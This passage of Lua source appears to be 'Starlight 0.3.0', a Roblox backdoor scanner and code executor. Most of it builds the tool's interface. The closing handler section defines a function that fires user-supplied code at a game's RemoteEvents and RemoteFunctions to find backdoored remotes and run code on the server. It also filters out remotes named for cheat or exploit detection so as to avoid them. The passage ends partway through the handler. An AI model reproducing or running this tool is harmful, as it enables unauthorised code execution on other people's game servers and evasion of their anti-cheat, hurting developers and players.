G2L["3a"] = Instance.new("UIStroke", G2L["27"]);
G2L["3a"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.UICorner
G2L["3b"] = Instance.new("UICorner", G2L["27"]);
G2L["3b"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.UIStroke
G2L["3c"] = Instance.new("UIStroke", G2L["27"]);
G2L["3c"]["Thickness"] = 0.7;
G2L["3c"]["Color"] = Color3.fromRGB(90, 90, 90);
G2L["3c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Execute
G2L["3d"] = Instance.new("TextButton", G2L["24"]);
G2L["3d"]["BorderSizePixel"] = 0;
G2L["3d"]["TextSize"] = 14;
G2L["3d"]["AutoButtonColor"] = false;
G2L["3d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["3d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3d"]["Size"] = UDim2.new(0, 42, 0, 42);
G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["Text"] = [[]];
G2L["3d"]["Name"] = [[Execute]];
G2L["3d"]["Position"] = UDim2.new(0, 10, 1, -52);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Execute.UICorner
G2L["3e"] = Instance.new("UICorner", G2L["3d"]);
G2L["3e"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Execute.UIStroke
G2L["3f"] = Instance.new("UIStroke", G2L["3d"]);
G2L["3f"]["Thickness"] = 1.5;
G2L["3f"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["3f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Execute.Icon
G2L["40"] = Instance.new("ImageLabel", G2L["3d"]);
G2L["40"]["Interactable"] = false;
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
G2L["40"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["40"]["Image"] = [[rbxassetid://7980684777]];
G2L["40"]["Size"] = UDim2.new(0, 35, 0, 35);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["BackgroundTransparency"] = 1;
G2L["40"]["Rotation"] = 90;
G2L["40"]["Name"] = [[Icon]];
G2L["40"]["Position"] = UDim2.new(0.5, 2, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Clear
G2L["41"] = Instance.new("TextButton", G2L["24"]);
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextSize"] = 14;
G2L["41"]["AutoButtonColor"] = false;
G2L["41"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["41"]["Size"] = UDim2.new(0, 42, 0, 42);
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[]];
G2L["41"]["Name"] = [[Clear]];
G2L["41"]["Position"] = UDim2.new(0, 65, 1, -52);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Clear.UICorner
G2L["42"] = Instance.new("UICorner", G2L["41"]);
G2L["42"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Clear.UIStroke
G2L["43"] = Instance.new("UIStroke", G2L["41"]);
G2L["43"]["Thickness"] = 1.5;
G2L["43"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["43"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Clear.Icon
G2L["44"] = Instance.new("ImageLabel", G2L["41"]);
G2L["44"]["Interactable"] = false;
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
G2L["44"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["44"]["Image"] = [[rbxassetid://16346922164]];
G2L["44"]["Size"] = UDim2.new(0, 35, 0, 35);
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["BackgroundTransparency"] = 1;
G2L["44"]["Name"] = [[Icon]];
G2L["44"]["Position"] = UDim2.new(0.5, -2, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Attach
G2L["45"] = Instance.new("TextButton", G2L["24"]);
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["TextSize"] = 14;
G2L["45"]["AutoButtonColor"] = false;
G2L["45"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["45"]["Size"] = UDim2.new(0, 42, 0, 42);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Text"] = [[]];
G2L["45"]["Name"] = [[Attach]];
G2L["45"]["Position"] = UDim2.new(1, -52, 1, -52);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Attach.UICorner
G2L["46"] = Instance.new("UICorner", G2L["45"]);
G2L["46"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Attach.UIStroke
G2L["47"] = Instance.new("UIStroke", G2L["45"]);
G2L["47"]["Thickness"] = 1.5;
G2L["47"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["47"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Attach.Icon
G2L["48"] = Instance.new("ImageLabel", G2L["45"]);
G2L["48"]["Interactable"] = false;
G2L["48"]["BorderSizePixel"] = 0;
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
G2L["48"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["48"]["Image"] = [[rbxassetid://115736032752379]];
G2L["48"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["48"]["BackgroundTransparency"] = 1;
G2L["48"]["Name"] = [[Icon]];
G2L["48"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.ScaningText
G2L["49"] = Instance.new("TextLabel", G2L["24"]);
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["TextSize"] = 32;
G2L["49"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["49"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["BackgroundTransparency"] = 1;
G2L["49"]["Size"] = UDim2.new(0, 0, 0, 32);
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Text"] = [[]];
G2L["49"]["Name"] = [[ScaningText]];
G2L["49"]["Position"] = UDim2.new(1, -12, 1, -48);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.R6
G2L["4a"] = Instance.new("TextButton", G2L["24"]);
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextSize"] = 14;
G2L["4a"]["AutoButtonColor"] = false;
G2L["4a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["Size"] = UDim2.new(0, 84, 0, 42);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[]];
G2L["4a"]["Name"] = [[R6]];
G2L["4a"]["Position"] = UDim2.new(0, 120, 1, -52);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.R6.UICorner
G2L["4b"] = Instance.new("UICorner", G2L["4a"]);
G2L["4b"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.R6.UIStroke
G2L["4c"] = Instance.new("UIStroke", G2L["4a"]);
G2L["4c"]["Thickness"] = 1.5;
G2L["4c"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["4c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.R6.Title
G2L["4d"] = Instance.new("TextLabel", G2L["4a"]);
G2L["4d"]["TextWrapped"] = true;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["TextSize"] = 42;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["4d"]["TextColor3"] = Color3.fromRGB(145, 145, 145);
G2L["4d"]["BackgroundTransparency"] = 1;
G2L["4d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Text"] = [[R6]];
G2L["4d"]["Name"] = [[Title]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Scripts
G2L["4e"] = Instance.new("Frame", G2L["21"]);
G2L["4e"]["BorderSizePixel"] = 0;
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["ClipsDescendants"] = true;
G2L["4e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Name"] = [[Scripts]];
G2L["4e"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Scripts.UICorner
G2L["4f"] = Instance.new("UICorner", G2L["4e"]);
G2L["4f"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Scripts.TextLabel
G2L["50"] = Instance.new("TextLabel", G2L["4e"]);
G2L["50"]["TextWrapped"] = true;
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["TextSize"] = 53;
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["BackgroundTransparency"] = 1;
G2L["50"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[Coming Soon!]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings
G2L["51"] = Instance.new("Frame", G2L["21"]);
G2L["51"]["Visible"] = false;
G2L["51"]["BorderSizePixel"] = 0;
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51"]["ClipsDescendants"] = true;
G2L["51"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["Name"] = [[Settings]];
G2L["51"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.UICorner
G2L["52"] = Instance.new("UICorner", G2L["51"]);
G2L["52"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console
G2L["53"] = Instance.new("ScrollingFrame", G2L["51"]);
G2L["53"]["Active"] = true;
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
-- [ERROR] cannot convert TopImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["53"]["TopImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
G2L["53"]["Name"] = [[Console]];
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
-- [ERROR] cannot convert BottomImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["53"]["BottomImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
G2L["53"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["53"]["Size"] = UDim2.new(0, 300, 1, -20);
G2L["53"]["Position"] = UDim2.new(0, 10, 0, 10);
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["ScrollBarThickness"] = 8;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console.UIStroke
G2L["54"] = Instance.new("UIStroke", G2L["53"]);
G2L["54"]["Thickness"] = 0.7;
G2L["54"]["Color"] = Color3.fromRGB(90, 90, 90);
G2L["54"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console.UICorner
G2L["55"] = Instance.new("UICorner", G2L["53"]);
G2L["55"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console.Example
G2L["56"] = Instance.new("TextLabel", G2L["53"]);
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextSize"] = 15;
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["BackgroundTransparency"] = 1;
G2L["56"]["Visible"] = false;
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Text"] = [[]];
G2L["56"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["56"]["Name"] = [[Example]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console.UIListLayout
G2L["57"] = Instance.new("UIListLayout", G2L["53"]);
G2L["57"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Title1
G2L["58"] = Instance.new("TextLabel", G2L["51"]);
G2L["58"]["BorderSizePixel"] = 0;
G2L["58"]["TextSize"] = 32;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["58"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["BackgroundTransparency"] = 1;
G2L["58"]["Size"] = UDim2.new(0, 0, 0, 32);
G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Text"] = [[Scan Type]];
G2L["58"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["58"]["Name"] = [[Title1]];
G2L["58"]["Position"] = UDim2.new(0, 350, 0, 10);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox
G2L["59"] = Instance.new("Frame", G2L["51"]);
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["59"]["Size"] = UDim2.new(0, 24, 0, 24);
G2L["59"]["Position"] = UDim2.new(0, 325, 0, 45);
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Name"] = [[EventCheckbox]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.UIStroke
G2L["5a"] = Instance.new("UIStroke", G2L["59"]);
G2L["5a"]["Thickness"] = 0.7;
G2L["5a"]["Color"] = Color3.fromRGB(90, 90, 90);
G2L["5a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.UICorner
G2L["5b"] = Instance.new("UICorner", G2L["59"]);
G2L["5b"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.Button
G2L["5c"] = Instance.new("TextButton", G2L["59"]);
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["TextSize"] = 14;
G2L["5c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5c"]["BackgroundTransparency"] = 1;
G2L["5c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["Text"] = [[]];
G2L["5c"]["Name"] = [[Button]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.Icon
G2L["5d"] = Instance.new("ImageLabel", G2L["59"]);
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["5d"]["Image"] = [[rbxassetid://12690727184]];
G2L["5d"]["Size"] = UDim2.new(0, 12, 0, 12);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["BackgroundTransparency"] = 1;
G2L["5d"]["Name"] = [[Icon]];
G2L["5d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.Title
G2L["5e"] = Instance.new("TextLabel", G2L["59"]);
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["TextSize"] = 18;
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["BackgroundTransparency"] = 1;
G2L["5e"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Text"] = [[  Scan for Events]];
G2L["5e"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["5e"]["Name"] = [[Title]];
G2L["5e"]["Position"] = UDim2.new(1, 0, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox
G2L["5f"] = Instance.new("Frame", G2L["51"]);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["5f"]["Size"] = UDim2.new(0, 24, 0, 24);
G2L["5f"]["Position"] = UDim2.new(0, 325, 0, 80);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Name"] = [[FunctionCheckbox]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.UIStroke
G2L["60"] = Instance.new("UIStroke", G2L["5f"]);
G2L["60"]["Thickness"] = 0.7;
G2L["60"]["Color"] = Color3.fromRGB(90, 90, 90);
G2L["60"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.UICorner
G2L["61"] = Instance.new("UICorner", G2L["5f"]);
G2L["61"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.Button
G2L["62"] = Instance.new("TextButton", G2L["5f"]);
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextSize"] = 14;
G2L["62"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["BackgroundTransparency"] = 1;
G2L["62"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Text"] = [[]];
G2L["62"]["Name"] = [[Button]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.Icon
G2L["63"] = Instance.new("ImageLabel", G2L["5f"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["63"]["Image"] = [[rbxassetid://12690727184]];
G2L["63"]["Size"] = UDim2.new(0, 12, 0, 12);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["BackgroundTransparency"] = 1;
G2L["63"]["Name"] = [[Icon]];
G2L["63"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.Title
G2L["64"] = Instance.new("TextLabel", G2L["5f"]);
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["TextSize"] = 18;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["64"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["BackgroundTransparency"] = 1;
G2L["64"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Text"] = [[  Scan for Functions]];
G2L["64"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["64"]["Name"] = [[Title]];
G2L["64"]["Position"] = UDim2.new(1, 0, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Title2
G2L["65"] = Instance.new("TextLabel", G2L["51"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["TextSize"] = 32;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["BackgroundTransparency"] = 1;
G2L["65"]["Size"] = UDim2.new(0, 0, 0, 32);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Text"] = [[Background]];
G2L["65"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["65"]["Name"] = [[Title2]];
G2L["65"]["Position"] = UDim2.new(0, 342, 0, 125);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.BackgroundChanger
G2L["66"] = Instance.new("TextButton", G2L["51"]);
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["TextSize"] = 14;
G2L["66"]["AutoButtonColor"] = false;
G2L["66"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["66"]["Size"] = UDim2.new(0, 128, 0, 64);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["Text"] = [[]];
G2L["66"]["Name"] = [[BackgroundChanger]];
G2L["66"]["Position"] = UDim2.new(1, -153, 1, -78);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.BackgroundChanger.UICorner
G2L["67"] = Instance.new("UICorner", G2L["66"]);
G2L["67"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.BackgroundChanger.UIStroke
G2L["68"] = Instance.new("UIStroke", G2L["66"]);
G2L["68"]["Thickness"] = 1.5;
G2L["68"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["68"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.BackgroundChanger.Title
G2L["69"] = Instance.new("TextLabel", G2L["66"]);
G2L["69"]["TextWrapped"] = true;
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["TextSize"] = 24;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["69"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["BackgroundTransparency"] = 1;
G2L["69"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Text"] = [[Current: Normal]];
G2L["69"]["Name"] = [[Title]];


-- StarterGui.Starlight.MainFrame.Background
G2L["6a"] = Instance.new("ImageLabel", G2L["2"]);
G2L["6a"]["ZIndex"] = -1;
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["BackgroundTransparency"] = 1;
G2L["6a"]["Name"] = [[Background]];


-- StarterGui.Starlight.MainFrame.Background.UICorner
G2L["6b"] = Instance.new("UICorner", G2L["6a"]);
G2L["6b"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Handler
local function C_e()
local script = G2L["e"];
	--UI Objects
	local sgui = script.Parent.Parent
	local mainframe = sgui.MainFrame
	local insides = mainframe.Insides
	local tabsframe = insides.Tabs
	local tabs = {
		executor = tabsframe.Executor,
		scripts = tabsframe.Scripts,
		settings = tabsframe.Settings,
	}
	local buttons = {
		exit = mainframe.Exit,
		minimze = mainframe.Minimize,
		execute = tabs.executor.Execute,
		clear = tabs.executor.Clear,
		attach = tabs.executor.Attach,
		r6 = tabs.executor.R6,
		eventcheckbox = tabs.settings.EventCheckbox.Button,
		functioncheckbox = tabs.settings.FunctionCheckbox.Button,
		changebackground = tabs.settings.BackgroundChanger
	}
	
	local scanningtext = tabs.executor.ScaningText
	local status = insides.TabSelector.Status
	local console = tabs.settings.Console
	local examplelog = console.Example
	local background = mainframe.Background
	
	--Variables
	local services = {
		uis = game:GetService("UserInputService"),
		startergui = game:GetService("StarterGui"),
		logservice = game:GetService("LogService"),
	}
	local info = {
		vulninstance = nil,
		backdoored = false,
		timeout = 0.4,
		currentbackground = 1,
	}
	local scanfor = {
		events = true,
		functions = true,
	}
	local player = game:GetService("Players").LocalPlayer
	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
	local minimized = false
	local dragging, dragstart, startpos
	
	--Functions
	local function playsound(id)
		local sound = Instance.new("Sound",game:GetService("SoundService"))
		sound.SoundId = "rbxassetid://"..tostring(id)
		sound.Volume = 0.5
		sound.PlayOnRemove = true
		sound:Destroy()
	end
	
	local function notify(message, duration)
		pcall(function()
			playsound(8055713313)
			services.startergui:SetCore("SendNotification", {
				Title = "💫 Starlight 0.3.0",
				Text = tostring(message),
				Duration = duration or 3,
			})
		end)
	end
	
	local function fire(instance: RemoteEvent | RemoteFunction, code)
		if instance == nil then return end
	
		pcall(function()
			if instance:IsA("RemoteEvent") then
				instance:FireServer(code)
			elseif instance:IsA("RemoteFunction") then
				coroutine.wrap(function()
					return instance:InvokeServer(code)
				end)()
			end
		end)
	end
	
	local function checkremote(instance: RemoteEvent | RemoteFunction)
		for _, str in ipairs(blacklistedstrings) do
			if string.find(instance.Name:lower(), str:lower()) then
				return true
			end
		end
		if instance:FindFirstChild("__FUNCTION") or instance.Name == "__FUNCTION" or instance.Name == "CharacterSoundEvent" then
			return true
		end
		if instance.Parent.Parent then
			if instance.Parent.Parent.Name == "HDAdminClient" and instance.Parent.Name == "Signals" then
				return true
			end
			if instance.Parent.Name == "RobloxReplicatedStorage" 
				or instance.Parent.Name == "DefaultChatSystemChatEvents" then
				return true
			end
		end
		return false
	end
	
	--MainFrame Dragging
	pcall(function()
		mainframe.InputBegan:Connect(function(input)
			if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
				dragging, dragstart, startpos = true, input.Position, mainframe.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then dragging = false end
				end)
			end
		end)
